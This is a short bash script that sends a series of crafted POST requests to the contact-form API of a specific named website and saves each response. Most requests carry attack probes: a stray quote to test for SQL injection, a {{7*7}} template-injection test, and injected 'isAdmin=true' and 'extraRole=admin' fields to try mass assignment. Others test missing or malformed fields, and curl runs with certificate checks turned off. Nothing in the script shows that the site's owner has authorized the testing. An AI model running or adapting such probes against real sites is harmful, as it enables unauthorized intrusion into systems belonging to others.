#!/bin/bash
D=$(dirname "$0"); U="https://www.infinitycapital.bh/api/send"
post(){ curl -sk --globoff -X POST "$U" -H 'Content-Type: application/x-www-form-urlencoded' --data "$1" -o "$D/s_$2.json" -w "%{http_code} %{size_download}" ; echo " [$2] $(head -c 200 "$D/s_$2.json"|tr -d '\n')"; sleep 2; }
post 'fname=a&lname=b&areacode=973&tel=5551234&cname=T&subject=Hi&msg=Body&check=on&targets=test@example.org' base
post "fname=a'&lname=b&areacode=973&tel=5551234&cname=T&subject=Hi&msg=Body&check=on&targets=test@example.org" sqli_quote
post 'fname={{7*7}}&lname=b&areacode=973&tel=5551234&cname=T&subject=Hi&msg=Body&check=on&targets=test@example.org' ssti1
post 'fname=a&lname=b&areacode=973&tel=5551234&cname=T&subject=Hi&msg=Body&check=on' notargets
post 'fname=a&lname=b&areacode=973&tel=5551234&cname=T&subject=Hi&msg=Body&check=on&targets=not-an-email' bademail
post 'fname=a&lname=b&areacode=973&tel=5551234&cname=T&subject=Hi&msg=Body&check=on&extraRole=admin&isAdmin=true' massassign